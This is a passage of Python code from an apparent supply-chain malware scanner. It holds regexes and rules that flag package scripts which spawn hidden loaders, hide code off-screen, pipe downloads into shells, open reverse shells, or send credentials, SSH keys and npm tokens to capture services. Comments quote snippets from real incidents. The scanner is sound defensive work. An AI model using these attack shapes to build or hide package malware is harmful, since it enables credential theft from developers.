    if len(base) <= _DV_MAX_CHARS and any(n in base for n in _DV_NEEDLES):
        view = _dv_decoders(view)                   # (a longer text with a string array: its strings only)
    if view == joined and base is text:
        return text, None           # nothing decoded: literals joined alone are no reading of their own
    arrays = 0
    for m in list(_DV_ARRAY_RE.finditer(view)):
        if arrays >= _DV_MAX_ARRAYS:
            break
        name = m.group("name")
        items = _DV_STR_ITEM_RE.findall(m.group("items"))
        esc = re.escape(name)
        if (re.search(_DV_NAME_HEAD + esc + _DV_MUTATED_TAIL, view)
                or len(re.findall(_DV_NAME_HEAD + esc + _DV_ASSIGNED_TAIL, view)) != 1):
            continue
        arrays += 1
        view = re.sub(_DV_NAME_HEAD + esc + _DV_INDEX_TAIL,
                      lambda i: items[int(i.group(1))] if int(i.group(1)) < len(items) else i.group(), view)
    return (_DV_MEMBER_RE.sub(lambda m: "." + (m.group("a") or m.group("b")), view) if "[" in view else view), line


# ---------------- Scripts a script starts with node or python (0.1.8) ----------------
# A payload need not be the file a hook names: react-thunk-log's postinstall
# ran lib/utils/index.js, which did nothing but start
# spawn(process.execPath, [path.join(__dirname, 'smtp-connection/index.js')],
# {detached: true}) — the file that ran the code hidden in a LICENSE; the
# 2026 lightning release's __init__.py started _runtime/start.py with
# sys.executable. The install-script and import-time tests follow such a
# start to the package file it runs (spawned_scripts): node started by
# spawn / execFile (process.execPath, process.argv[0], 'node'; or 'bun' and
# 'deno', their `run` skipped) or by fork, Python by Popen / run / call
# (sys.executable, 'python…'); and any program a variable names — a runtime
# the script fetched: the 2026 setup.mjs loaders downloaded Bun and ran
# execFileSync(bun, [path.join(dir, 'router_init.js')]) — when what it is
# given is a file of code (_SPAWN_SCRIPT_EXT_RE; _SPAWN_MAX_NAMED such
# starts a file). The script is the first argument that is not a flag,
# written as a literal (relative to the directory the package runs in), a
# path.join / path.resolve / os.path.join or a pathlib `/` from the
# script's own directory (__dirname, os.path.dirname(__file__),
# Path(__file__).parent, dirname(fileURLToPath(import.meta.url)),
# import.meta.dirname) or of literals, `__dirname + '/x'`, str() of one, or
# a name assigned one of those in the file (followed _SPAWN_NAME_DEPTH names
# deep).
# The started file is then read like the one that started it,
# _SPAWN_MAX_DEPTH starts deep and _SPAWN_MAX_FILES files per hook at most.
# A path the file decodes as it runs is read too: the starts are read again
# in the decoded view (@fnos/app kept its runner's path as character codes).
_SPAWN_MAX_DEPTH = 3
_SPAWN_MAX_FILES = 20
_SPAWN_NAME_DEPTH = 3
_SPAWN_MAX_TARGETS = 8          # started scripts read from one file, at most
_SPAWN_MAX_NAMED = 32           # starts of a program a variable names read from one file, at most
_SPAWN_CALL_SRC = (
    r"""\b(?:spawn|spawnSync|execFile|execFileSync)\s*\(\s*(?:process\s*\.\s*execPath|process\s*\.\s*argv\s*\[\s*0\s*\]"""
    r"""|['"`](?:node|nodejs|(?P<rt>bun|deno))(?:\.exe)?['"`]|(?P<js>[A-Za-z_$][\w$]*))\s*,\s*\[|\bfork\s*\("""
    r"""|\b(?:Popen|run|call|check_call|check_output)\s*\(\s*\[\s*(?:sys\s*\.\s*executable"""
    r"""|['"]python[0-9.]*(?:\.exe)?['"]|(?P<py>[A-Za-z_]\w*))\s*,""")
_SPAWN_CALL_RE = re.compile(_SPAWN_CALL_SRC)
# a script a program named by a variable is given: a file of code
_SPAWN_SCRIPT_EXT_RE = re.compile(r"\.(?:[cm]?[jt]s|[jt]sx|py)$", re.I)
# str(p): the path p (Python)
_SPAWN_STR_RE = re.compile(r"str\s*\(\s*([A-Za-z_]\w*)\s*\)")
_SPAWN_LIT_SRC = (r"""'(?P<a>[^'"`\n$\\]{1,200})'|"(?P<b>[^'"`\n$\\]{1,200})"|`(?P<c>[^'"`\n$\\]{1,200})`""")
_SPAWN_LIT_RE = re.compile(_SPAWN_LIT_SRC)
_SPAWN_DIR_SRC = (r"""__dirname|os\s*\.\s*path\s*\.\s*dirname\s*\(\s*(?:os\s*\.\s*path\s*\.\s*(?:abspath|realpath)"""
                  r"""\s*\(\s*)?__file__\s*\)?\s*\)|Path\s*\(\s*__file__\s*\)\s*(?:\.\s*resolve\s*\(\s*\))?\s*\.\s*parent"""
                  r"""(?:\s*\.\s*resolve\s*\(\s*\))?|(?:path\s*\.\s*)?dirname\s*\(\s*(?:url\s*\.\s*)?fileURLToPath\s*\("""
                  r"""\s*import\s*\.\s*meta\s*\.\s*url\s*\)\s*\)|import\s*\.\s*meta\s*\.\s*dirname""")
_SPAWN_DIR_RE = re.compile(_SPAWN_DIR_SRC)
_SPAWN_JOIN_SRC = r"""(?:path\s*\.\s*(?:join|resolve)|os\s*\.\s*path\s*\.\s*join)\s*\("""
_SPAWN_JOIN_RE = re.compile(_SPAWN_JOIN_SRC)
_SPAWN_CONCAT_SRC = (r"""__dirname\s*\+\s*(?:'/?(?P<a>[^'"`\n$\\]{1,200})'|"/?(?P<b>[^'"`\n$\\]{1,200})""" + '"'
                     + r"""|`/?(?P<c>[^'"`\n$\\]{1,200})`)|`\$\{\s*__dirname\s*\}/(?P<t>[^`$\n\\]{1,200})`""")
_SPAWN_CONCAT_RE = re.compile(_SPAWN_CONCAT_SRC)
_SPAWN_NAME_SRC = r"""[A-Za-z_$][\w$]*"""
_SPAWN_NAME_RE = re.compile(_SPAWN_NAME_SRC)
# a name's assignment, as _spawn_path looks one up (the name escaped between them)
_SPAWN_ASSIGN_HEAD = r"(?<![\w$.])"
_SPAWN_ASSIGN_TAIL = r"\s*=(?![=>])\s*(?P<e>[^\n;]{1,300})"
_SPAWN_NO_SCRIPT_FLAGS = frozenset(("-m", "-c", "-e", "-p", "--eval", "--print"))
_SPAWN_VALUE_FLAGS = frozenset(("-r", "--require", "--import", "--loader", "--experimental-loader", "-W", "-X"))


def _spawn_args(text, i, limit=400):
    """The arguments of a call or a list starting at text[i], as far as the
    ']' or ')' that closes it, split at its top-level commas (a quote-aware
    pass over at most `limit` characters); [] when it does not close."""
    args, depth, start, j, end = [], 0, i, i, min(len(text), i + limit)
    quote = None
    while j < end:
        ch = text[j]
        if quote is not None:
            if ch == "\\":
                j += 2
                continue
            if ch == quote:
                quote = None
        elif ch in "'\"`":
            quote = ch
        elif ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth == 0:
                args.append(text[start:j])
                return [a.strip() for a in args]
            depth -= 1
        elif ch == "," and depth == 0:
            args.append(text[start:j])
            start = j + 1
        j += 1
    return []


def _spawn_pieces(expr):
    """The operands of `expr` split at its top-level '/' (Python's `Path /
    'x'`), outside quotes and brackets."""
    pieces, depth, start, quote, j = [], 0, 0, None, 0
    while j < len(expr):
        ch = expr[j]
        if quote is not None:
            if ch == "\\":
                j += 2
                continue
            if ch == quote:
                quote = None
        elif ch in "'\"`":
            quote = ch
        elif ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif ch == "/" and depth == 0:
            pieces.append(expr[start:j].strip())
            start = j + 1
        j += 1
    pieces.append(expr[start:].strip())
    return pieces


def _spawn_join(parts, text, names):
    """(base, path) of a path joined from `parts`: the first a path or the
    script's own directory, the others literals (or names given one)."""
    head = _spawn_path(parts[0], text, names)
    if head is None:
        return None
    base, segs = head[0], [head[1]]
    for part in parts[1:]:
        piece = _spawn_path(part, text, names)
        if piece is None or piece[0] != "cwd":
            return None
        segs.append(piece[1])
    return base, "/".join(segs)


def _spawn_path(expr, text, names):
    """(base, path) a script argument names — base 'dir' (the script's own
    directory: its path '.') or 'cwd' (the directory the package runs in) —
    else None."""
    expr = expr.strip()
    m = _SPAWN_LIT_RE.fullmatch(expr)
    if m is not None:
        lit = m.group("a") or m.group("b") or m.group("c")
        return None if lit.startswith("-") else ("cwd", lit)
    m = _SPAWN_CONCAT_RE.fullmatch(expr)
    if m is not None:
        return "dir", m.group("a") or m.group("b") or m.group("c") or m.group("t")
    if _SPAWN_DIR_RE.fullmatch(expr):
        return "dir", "."
    m = _SPAWN_STR_RE.fullmatch(expr)
    if m is not None:
        return _spawn_path(m.group(1), text, names)
    m = _SPAWN_JOIN_RE.match(expr)
    if m is not None:
        parts = _spawn_args(expr, m.end())
        if not parts or not expr.rstrip().endswith(")"):
            return None
        return _spawn_join(parts, text, names)
    if "/" in expr:
        pieces = _spawn_pieces(expr)
        if len(pieces) > 1 and all(pieces):
            return _spawn_join(pieces, text, names)
    if _SPAWN_NAME_RE.fullmatch(expr) and names > 0:
        am = re.search(_SPAWN_ASSIGN_HEAD + re.escape(expr) + _SPAWN_ASSIGN_TAIL, text)
        if am is not None:
            value = am.group("e")
            parts = _spawn_args(value + ")", 0)          # its first top-level segment
            return _spawn_path(parts[0] if parts else value, text, names - 1)
    return None


def spawned_scripts(text):
    """[(base, path)]: the package scripts `text` starts with node or python
    (see above), base 'dir' or 'cwd', at most _SPAWN_MAX_TARGETS: read as
    written, then with the strings it decodes as it runs decoded
    (decoded_view), so a path it hides is followed too."""
    out = _spawned_scripts(text)
    if len(out) < _SPAWN_MAX_TARGETS:
        view = decoded_view(text)
        if view != text:
            for target in _spawned_scripts(view):
                if target not in out:
                    out.append(target)
                    if len(out) >= _SPAWN_MAX_TARGETS:
                        break
    return out


def _spawned_scripts(text):
    """spawned_scripts' reading of one text."""
    if not any(n in text for n in ("spawn", "execFile", "fork", "Popen", "run", "call", "check_")):
        return []
    out, named_calls = [], 0
    for m in _SPAWN_CALL_RE.finditer(text):
        named = m.group("js") is not None or m.group("py") is not None
        if named:
            named_calls += 1
            if named_calls > _SPAWN_MAX_NAMED:
                continue
        args, skip = _spawn_args(text, m.end()), False
        runs = _JS_RUNTIMES.get(m.group("rt") or "", frozenset())   # `bun run x.js`
        for arg in args[:6]:
            if skip:
                skip = False
                continue
            lit = _SPAWN_LIT_RE.fullmatch(arg)
            value = None if lit is None else lit.group("a") or lit.group("b") or lit.group("c")
            if value is not None and value.startswith("-"):   # a flag of node's or python's
                flag = value.split("=", 1)[0]
                if flag in _SPAWN_NO_SCRIPT_FLAGS:
                    break                                 # inline code or a module: no script file
                skip = flag in _SPAWN_VALUE_FLAGS and "=" not in value
                continue
            if value is not None and value in runs:
                runs = frozenset()
                continue
            target = _spawn_path(arg, text, _SPAWN_NAME_DEPTH)
            if target is not None:
                path = posixpath.normpath(target[1].replace("\\", "/"))
                if path not in (".", "") and not path.startswith("/") and (target[0], path) not in out \
                        and (not named or _SPAWN_SCRIPT_EXT_RE.search(path)):
                    out.append((target[0], path))
            break
        if len(out) >= _SPAWN_MAX_TARGETS:
            break
    return out


# ---------------- Code hidden off-screen (SC-OFFSCREEN-CODE, 0.1.8) ----------------
# @react-native-aria/radio 0.2.14 (June 2025) appended its loader to
# lib/commonjs/index.js after 731 spaces on the last line — past the right
# edge of every editor, diff and code review, where the interpreter runs it
# all the same; setup.py droppers do the same after a `;`. No formatter puts
# code _OFFSCREEN_MIN columns right of other code or of nothing: indentation
# stays under 100, and runs that long in the 0.1.7 benchmark's 429 popular
# packages were all prose (a docstring's alignment, a box drawing). So the
# run must stand in code, not in a string or a comment (_code_prefix: what
# comes before it on the line closes every quote and comment it opens; the
# caller also drops a line that is nothing but literals and comments, like a
# docstring's), and what follows it must read as code: punctuation that code
# starts with, a declaration, a name followed by . ( [ = ; or a quote, or a
# keyword that runs or imports. CRITICAL when the hidden text runs or loads
# code (require, import, eval, exec, Function, child_process, spawn, a
# decoder, `global[…]`), else MAJOR.
_OFFSCREEN_SRC = r"""(?<![ \t])[ \t]{150,}(?=\S)"""
_OFFSCREEN_CODE_SRC = (
    r"""[;,(){}\[\]]|(?:const|let|var|function|async|class|def)\s+[A-Za-z_$(]|[A-Za-z_$][\w$]*\s*(?:[.(\[=;]|["'`])"""
    r"""|(?:import|from|exec|eval|require)\b""")
_OFFSCREEN_EXEC_SRC = (
    r"""\b(?:require|import|exec|eval|Function|child_process|spawn|execSync|__import__|compile|b64decode"""
    r"""|fromCharCode|atob)\b|\bglobal\s*\[""")
_OFFSCREEN_RE = re.compile(_OFFSCREEN_SRC)
_OFFSCREEN_CODE_RE = re.compile(_OFFSCREEN_CODE_SRC)
_OFFSCREEN_EXEC_RE = re.compile(_OFFSCREEN_EXEC_SRC)
#: The shortest run of blanks before code that counts
_OFFSCREEN_MIN = 150
#: Characters of the hidden code read for what it runs
_OFFSCREEN_READ = 4000


def _code_prefix(prefix, lang):
    """Does `prefix` (the start of a line) close every string and comment it
    opens — quotes with their escapes, and a JavaScript block comment — and
    open no line comment (# in Python, // in JavaScript)?"""
    quote, i, n = None, 0, len(prefix)
    while i < n:
        ch = prefix[i]
        if quote is not None:
            if ch == "\\":
                i += 2
                continue
            if ch == quote:
                quote = None
        elif ch == '"' or ch == "'" or (ch == "`" and lang == "js"):
            quote = ch
        elif lang == "py" and ch == "#":
            return False
        elif lang == "js" and ch == "/" and prefix.startswith("//", i):
            return False
        elif lang == "js" and ch == "/" and prefix.startswith("/*", i):
            end = prefix.find("*/", i + 2)
            if end < 0:
                return False
            i = end + 2
            continue
        i += 1
    return quote is None


def offscreen_code(line, lang):
    """-> (column, blanks, hidden text, runs code) for code that starts after a
    run of at least _OFFSCREEN_MIN blanks on `line`, in code (see above),
    else None. `lang` is 'js' or 'py'."""
    if len(line) <= _OFFSCREEN_MIN or " " * 16 not in line and "\t" * 16 not in line:
        return None
    m = _OFFSCREEN_RE.search(line)
    if (m is None or _OFFSCREEN_CODE_RE.match(line, m.end()) is None
            or not _code_prefix(line[:m.start()], lang)):
        return None
    hidden = line[m.end():m.end() + _OFFSCREEN_READ]
    return m.end(), m.end() - m.start(), hidden, _OFFSCREEN_EXEC_RE.search(hidden) is not None


_SELF_PUBLISH_RULE = {
    "id": "SC-SELF-PUBLISH", "name": "Code that republishes its package", "type": "HOTSPOT", "sev": "CRITICAL",
    "msg": "Renames its package (package.json's \"name\") and publishes it: the shape of registry spam and of "
           "packages that spread themselves.",
    "why": ("The 2025-26 registry floods shipped a script that gives package.json a new, random name and runs "
            "`npm publish` in a loop, from the account of whoever runs it. Release tools publish too, but never "
            "rename what they publish."),
    "fix": "Don't run it; report the package to the registry.",
    "ref": "CWE-506 · Supply chain"}
_OFFSCREEN_WHY = ("A long run of blanks pushes code past the right edge of editors, diffs and code review, while "
                  "the interpreter runs it all the same: @react-native-aria/radio 0.2.14 hid its loader 731 "
                  "columns right. No formatter puts code there.")


_OFFSCREEN_RULE = {
    "id": "SC-OFFSCREEN-CODE", "name": "Code hidden off-screen", "type": "HOTSPOT", "sev": "MAJOR",
    "msg": "Code after {blanks} blanks on this line, where editors and review don't show it: {preview!r}.",
    "why": _OFFSCREEN_WHY,
    "fix": "Read the whole line (turn on word wrap) and review what it does.",
    "ref": "CWE-506 · Supply chain"}
_OFFSCREEN_RUNS_WHY = _OFFSCREEN_WHY + " This code loads or runs more code."   # ... CRITICAL, when it does


def _offscreen_issue(path, line_no, lines, found):
    col, blanks, hidden, runs = found
    return mk_issue(
        dict(_OFFSCREEN_RULE, sev="CRITICAL" if runs else "MAJOR",
             msg=_OFFSCREEN_RULE["msg"].format(blanks=blanks, preview=_preview(hidden)),
             why=_OFFSCREEN_RUNS_WHY if runs else _OFFSCREEN_WHY), path, line_no, lines, col)


def install_script_risk(text, shell=True, command=False):
    """Reasons an install-time script looks hostile ([] if none): read as
    written, and again with the strings it decodes as it runs decoded
    (decoded_view; a reason found only there says so). A shell script is
    read as a program too (_shell_text; `shell`: False for a hook's command
    and the code it hands an interpreter, which hook_command_risk reads
    itself; `command`: the text is a hook's command, shell whatever it
    holds). Code built around a string array says so (_SA_TECHNIQUE_REASON)."""
    reasons = _install_script_risk(text, shell, command)
    view = decoded_view(text)
    if view != text:
        for r in _install_script_risk(view, shell, command):
            if r not in reasons:
                reasons.append(r + _DV_NOTE)
    if string_array_line(text) is not None:
        reasons.append(_SA_TECHNIQUE_REASON)
    return reasons


# A shell script (0.1.8): its #! line names a shell, or, without one, nothing
# in it is JavaScript or Python (require, import, def, =>, const …): the
# install script a hook runs (install.sh) is read by the shell reader
# (_sh_reasons), as a hook's command is. Up to _SH_SCRIPT_MAX_CHARS.
_SH_NOT_SHELL_RE = re.compile(
    r"\brequire\s*\(|(?<![^\n])[ \t]*(?:import|from)[ \t]+[\w.{*]|\bdef[ \t]+\w+\s*\(|=>"
    r"|(?<![^\n])[ \t]*(?:const|let|var|class)[ \t]+[A-Za-z_$]|\bconsole\s*\.\s*log\b|\bmodule\s*\.\s*exports\b"
    r"|\bprocess\s*\.\s*(?:env|argv|exit)\b|\bprint\s*\(|\bos\s*\.\s*(?:system|environ|popen)\b")
_SH_SCRIPT_MAX_CHARS = 1_000_000


def _code_text(text):
    """Is `text` JavaScript or Python rather than shell (its #! line, or what
    _SH_NOT_SHELL_RE finds)? A command written in code runs when it is
    handed to an exec call (0.1.8: a CLI's help text or an error message
    that shows `curl … | sh` or `irm … | iex` runs nothing)."""
    if text.startswith("#!"):
        lang = shebang_lang(text)
        if lang is not None:
            return lang != "sh"
    return _SH_NOT_SHELL_RE.search(text) is not None


def _shell_text(text):
    """Is `text` a shell script (see above)?"""
    if len(text) > _SH_SCRIPT_MAX_CHARS:
        return False
    if text.startswith("#!"):
        return shebang_lang(text) == "sh"
    return _SH_NOT_SHELL_RE.search(text) is None


# (0.1.8) What an install script sends is read as a flow (local_data_sent_at,
# exec_command_reasons; a hook's command by _sh_reasons): 0.1.7 made a script
# CRITICAL when it merely named the environment or a credential file, or
# the user or host name, anywhere in a file that used the network anywhere,
# or when it named a data-capture or exfiltration service. A service a list
# names is now where the data goes — a label on a send the flow found
# (_destination_label) — and a raw IP address a script connects to is still
# a sign of its own.
_SEND_REASONS = (tuple(_LD_REASONS.values()) + tuple(_SH_DATA_REASONS.values())
                 + (_SH_BEACON_REASON, "sends the machine's user or host name", "sends data to a webhook whose secret",
                    "collects files from several credential folders"))
_RAW_IP_URL_RE = re.compile(r"https?://(?:\d{1,3}\.){3}\d{1,3}\b", re.I)


def _destination(text):
    """The data-capture or exfiltration service `text` names (a match), else None."""
    return capture_service(text) or _EXFIL_SERVICE_RE.search(text)


def _destination_label(text):
    """The label of where a script that sends data sends it (see above): a
    data-capture or exfiltration service it names, else None."""
    m = _destination(text)
    return None if m is None else f"contacts an address typical of data exfiltration ({m.group(0)[:40]})"


def _label_sends(text, reasons):
    """Adds to `reasons` the label of where the data goes, when one of them sends it."""
    if any(r.startswith(_SEND_REASONS) for r in reasons):
        label = _destination_label(text)
        if label is not None and label not in reasons:
            reasons.append(label)


def _install_script_risk(text, shell=True, command=False):
    reasons = []
    # a download piped or substituted into a shell, and PowerShell: in code,
    # where an exec call is handed them (as at import time: _code_text)
    code = not command and _code_text(text)
    rows = text.split("\n") if "curl" in text or "wget" in text else ()
    if (any(_pipes_download_to_shell(row) and _EXEC_CALL_RE.search(row) is not None for row in rows) if code
            else _pipes_download_to_shell(text)):
        reasons.append("pipes a download into a shell")
    substituted = any(runs_substituted_download(row) and (not code or _EXEC_CALL_RE.search(row) is not None)
                      for row in rows)
    received = _received_code_kind(text)
    if substituted:
        reasons.append(_DL_CATEGORY_REASON["run"])
    elif received is not None:
        reasons.append(_DL_CATEGORY_REASON[received[1]])
    ps = powershell_risk(text)
    if ps and (not code or _powershell_run_at(text) >= 0):
        reasons.extend(ps)
    if (received is None or received[1] != "run") and not substituted and stager_at(text) >= 0:
        reasons.append("carries a script that downloads and runs code")
    if reverse_shell_at(text) >= 0:
        reasons.append("opens a reverse shell")
    host = _HOST_INFO_RE.search(text)
    for _at, reason in _exfil_signs(text, host):
        if reason not in reasons:
            reasons.append(reason)
    ip = _RAW_IP_URL_RE.search(text)
    ip = ip.group(0)[:40] if ip is not None else raw_ip_connect(text)
    if ip is not None:
        reasons.append(f"contacts an address typical of data exfiltration ({ip})")
    if runs_own_source_at(text) >= 0:
        reasons.append("runs code it reads back from its own file or a data file shipped with it")
    # (0.1.8) data read from the machine and sent, whatever the address; the
    # commands the script runs, read as programs; where the data goes
    flow = local_data_sent_at(text)
    if flow is not None:
        _at, kind, what, in_address = flow
        reason = _LD_REASONS[kind] + (f" ({what[:60]})" if kind in ("environment", "file", "report") else "")
        if not any(r.startswith(_LD_REASONS[kind]) for r in reasons) \
                and (not in_address or capture_service(text) is not None):
            reasons.append(reason)
    for r in exec_command_reasons(text):
        if r not in reasons:
            reasons.append(r)
    if shell and _shell_text(text):
        for r in _sh_reasons(text, 0, False, _HookWalk()):
            if r not in reasons:
                reasons.append(r)
    _label_sends(text, reasons)
    reasons.extend(persistence_reasons(text))
    if _PUBLISH_CMD_RE.search(text) is not None:
        reasons.append("publishes a package to a registry (npm publish)")
    if _NPM_TOKEN_READ_RE.search(text) is not None:
        reasons.append("collects npm access tokens")
    dll = runs_dll(text)
    if dll is not None:
        reasons.append(f"runs a DLL with rundll32 or regsvr32 ({dll[:40]})")
    # a script it downloads, or decodes, written to a file and run with a
    # shell or an interpreter (a file run on its own stays the import-time
    # test's MAJOR shape: a prebuilt binary's installer does that)
    dropped = _downloads_and_runs(text)
    if dropped is not None:
        interp = "Python" if _PY_RUN_RE.search(text) else dropped[1]
        if interp:
            reasons.append(f"downloads a script and runs it with {interp}")
    decoded = _decodes_and_runs(text)
    if decoded is not None:
        interp = "Python" if _PY_RUN_RE.search(text) else decoded[1]
        reasons.append(f"writes code it decodes to a file and runs it with {interp}" if interp
                       else "writes a file it decodes and runs it")
    return reasons


# ---------------- Import-time inspection ----------------
# Code that runs when a package is loaded — what an npm package's main, bin
# and exports reach, a wheel's top-level packages and modules — gets a weaker
# version of the install-script test: a MAJOR finding (a weak indicator,
# WARN), never CRITICAL, and only on shapes ordinary SDKs don't share.
# (0.1.8) What it sends is read as a flow (local_data_sent_at, and the
# command lines it hands a shell: _import_flow). Local data sent to a
# data-capture service (webhook.site, an ngrok tunnel's address …) or to a
# public IP address is CRITICAL, whatever the data; what no client sends —
# the whole environment, the instance's credentials, a credential store (an
# SSH private key, not its .pub; git's credentials; a browser's local
# storage) — is CRITICAL sent to an exfiltration service a list names
# (Telegram, Discord, pastebin …: a client talks to those with its user's
# key) and MAJOR sent anywhere else. The list is where the data goes; a
# library reports to its own API, so the variables it needs, or a tool's own
# config (.npmrc, .pypirc, ~/.aws), sent there are everyday SDK code, and an
# address alone never counts (cloud SDKs read 169.254.169.254; Telegram,
# ngrok or pastebin clients name their own service). What a request's
# address holds (in_address) counts only where the address is a capture
# service's. A download piped into a shell counts only on a line that hands
# it to an exec call, or in a command line an exec call is handed (a CLI's
# help text often shows `curl … | sh`).
_IMPORT_SENT_REASONS = {
    "address": "sends the machine's public IP address to a data-capture service",
    "identity": "sends the machine's user or host name to a data-capture service",
    "report": "sends what local commands report about the machine to a data-capture service",
    "environment": "reads credentials or the whole environment and sends them to an exfiltration service",
    "credentials": "reads credentials or the whole environment and sends them to an exfiltration service",
    "file": "reads local files and sends them to an exfiltration service",
}
_IMPORT_SENT_IP_REASONS = {
    "address": "sends the machine's public IP address to an IP address",
    "identity": "sends the machine's user or host name to an IP address",
    "report": "sends what local commands report about the machine to an IP address",
    "environment": "reads credentials or the whole environment and sends them to an IP address",
    "credentials": "reads credentials or the whole environment and sends them to an IP address",
    "file": "reads local files and sends them to an IP address",
}
# a public IP address in a URL (not a private, loopback or link-local one)
_PUBLIC_IP_URL_RE = re.compile(
    r"\b(?:https?|wss?|tcp)://(?!(?:10|127|0)\.)(?!192\.168\.)(?!172\.(?:1[6-9]|2\d|3[01])\.)(?!169\.254\.)"
    r"(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)(?![\d.])")
_CRED_STORE_RE = re.compile(r"""\.ssh\b|\bid_(?:rsa|ed25519|ecdsa|dsa)\b(?!\.pub)|\.git-credentials|Local Storage""", re.I)
_PUBLIC_KEY_FILE_RE = re.compile(r"\.pub\b|known_hosts", re.I)      # what .ssh holds that is no secret
_EXEC_CALL_RE = re.compile(
    r"""\b(?:execSync|exec|execFileSync|execFile|spawnSync|spawn|system|popen|Popen|run|call|"""
    r"""check_call|check_output|getoutput|getstatusoutput)\s*\(""")


# Import-time code that is SUSPICIOUS on its own (audit P0, 0.1.7): the
# test above stays MAJOR for what ordinary code can share (a download written
# to a file and run is a prebuilt-binary installer's shape; whole-environment
# reads meet network code in SDKs), but these reasons are CRITICAL wherever
# they are found — fetch-and-run and the other shapes install_script_risk
# names that no library needs: code received over the network and run, a
# download run through a shell, PowerShell that hides or fetches what it
# runs, a stager string, a reverse shell, local data sent to a data-capture
# service or a public IP address (the dependency-confusion beacon), what no
# client sends sent to an exfiltration service, a webhook whose secret is
# written in the code, a sweep of credential folders, the host name hidden
# in base64, in a DNS name or sent to an address fetched at run time, a
# miner, a download run with the Python interpreter (a script, not a
# binary), a GitHub Actions workflow that dumps every repository secret
# (see persistence targets), wallet addresses swapped, and code built around
# a string array (_SA_TECHNIQUE_REASON).
_STRONG_IMPORT_REASONS = (
    "runs code it receives over the network", "runs a downloaded script through a shell",
    "runs an encoded PowerShell command", "runs PowerShell that", "carries a script that downloads and runs code",
    "opens a reverse shell", "reads credentials or the whole environment and sends them to",
    "sends the machine's user or host name to a data-capture service", "downloads a script and runs it with",
    "writes code it decodes to a file and runs it with", "runs code it reads back from its own file",
    "carries a GitHub Actions workflow that dumps every repository secret",
    "sends data to a webhook whose secret is written in the code",
    "sends what local commands report about the machine to", "reads local files and sends them to an exfiltration service",
    "sends the machine's public IP address to", "sends the machine's user or host name to an IP address",
    "reads credentials or the whole environment and sends them to an IP address",
    "reads local files and sends them to an IP address",
    "collects files from several credential folders", "sends the machine's user or host name to an address it hides",
    "sends the machine's user or host name in a DNS lookup",
    "sends the machine's user or host name to an address it fetches",
    "runs a cryptocurrency miner", "swaps the cryptocurrency wallet addresses",
    "hides its code in a string array")
# Endpoints that exist to capture what is sent to them (out-of-band testing,
# request inspection): no library reports to one
_CAPTURE_SERVICE_RE = re.compile(
    r"webhook\.site|typedwebhook\.tools|oastify\.com|burpcollaborator|\binteract\.sh|\boast[\w.-]*\.(?:pro|live|site"
    r"|online|fun|me|com)\b|pipedream\.net|requestbin\.(?:com|net|io)\b|\brequestb\.in\b|requestcatcher\.com"
    r"|hookbin\.com|postb\.in\b|beeceptor\.com"
    r"|dnslog\.cn|ceye\.io|canarytokens", re.I)
# An ngrok tunnel's own address counts as one (0.1.8): a subdomain someone's
# laptop answers. Searched only in a text that names ngrok (the pattern can't
# be found quickly: it starts with any letter); lower case, as a host name
# is written in code.
_NGROK_TUNNEL_RE = re.compile(
    r"\b[a-z0-9][a-z0-9-]{2,62}\.ngrok(?:-free)?\.(?:app|io|dev)\b|\b\d+\.tcp(?:\.[a-z]{2,3})?\.ngrok\.io\b")


def capture_service(text):
    """The first data-capture service `text` names (_CAPTURE_SERVICE_RE), else
    an ngrok tunnel's address, else None (a match)."""
    m = _CAPTURE_SERVICE_RE.search(text)
    if m is None and "ngrok" in text:
        m = _NGROK_TUNNEL_RE.search(text)
    return m
_PY_RUN_RE = re.compile(
    r"""\[\s*(?:\w*sys\.executable|["']python[\d.w]*(?:\.exe)?["'])\s*,|\bstart\s+pythonw?\b"""
    r"""|\b(?:system|popen|getoutput|run|call|Popen)\s*\(\s*f?["']python[\d.w]*(?:\.exe)?\s""")

# Prose is not import-time code (0.1.7). On the audit's benign PyPI corpus a
# CLI's docstring showed `powershell -c "irm … | iex"` and a comment quoted
# `iwr … | iex` (huggingface-hub), and a docstring named ``id_rsa``
# (paramiko). A Python or JavaScript file that fails the test is read again
# with its comments blanked and, in Python, the string literals that stand
# alone as statements (docstrings, strings used as block comments) — not in
# a file that reads its own source (open(__file__), __doc__ … see
# _SELF_READ_RE): a comment can hold what it runs, or its C2 address. The text
# keeps its line breaks and one character per character, so lines and the
# patterns' bounds are the file's. PowerShell counts at import time only as
# an argument of an exec call (`os.system('powershell …')`,
# `subprocess.run(["pwsh", …])`, over lines): a CLI's self-update code
# builds the command in one function and runs it in another, and its help
# text shows one. Both are the test's rule for a download piped into a shell.
_PY_DOC_HEAD_RE = re.compile(r"[ \t]*[rRuUbB]{0,2}\Z")   # what may precede a statement string on its line
_PY_JOINS = "([{,=+-*/%&|^<>~@\\.\"'"   # code a string on the next line continues (or joins, as a literal)
_BRACKET_RE = re.compile(r"[()\[\]{}]")
_SPACE_TAB_RE = re.compile(r"[ \t]*")
_PS_EXEC_BACK = 300              # characters before a PowerShell name searched for the exec call it is in
_PS_EXEC_MAX_NAMES = 200         # PowerShell names examined per text


def _py_statement_literals(text, literals, comments):
    """The spans of `literals` (the lexer's) that stand alone as statements:
    a string, not an f-string, that begins its line outside brackets, after
    code that does not continue into it (a backslash, an operator, an open
    bracket, a comma or another string), with nothing but a comment after it
    on its line. One pass: each character is read a bounded number of times,
    however long its line."""
    out = []
    marks = sorted([(s, e, True) for s, e in literals] + [(s, e, False) for s, e in comments])
    depth, pos, last = 0, 0, ""        # bracket depth, end of the last mark, last code character
    for s, e, is_literal in marks:
        if s < pos:
            continue
        k = text.rfind("\n", pos, s)
        ls = k + 1 if k >= 0 else (0 if pos == 0 else -1)     # -1: a mark before it on its line
        prior = last                   # the last code character before the literal's line
        if ls > pos:
            code = text[pos:ls].rstrip()
            if code:
                prior = code[-1]
        gap = text[pos:s]
        for b in _BRACKET_RE.finditer(gap):
            depth = depth + 1 if b.group() in "([{" else max(0, depth - 1)
        code = gap.rstrip()
        if code:
            last = code[-1]
        pos = e
        if not is_literal:
            continue
        if e > s:
            last = text[e - 1]
        j = _SPACE_TAB_RE.match(text, e).end()
        if (ls >= 0 and depth == 0 and (not prior or prior not in _PY_JOINS) and _PY_DOC_HEAD_RE.match(text, ls, s)
                and not (ls >= 2 and text[ls - 2] == "\\") and (j == len(text) or text[j] in "\n#")):
            out.append((s, e))
    return out


def _blank(text, spans):
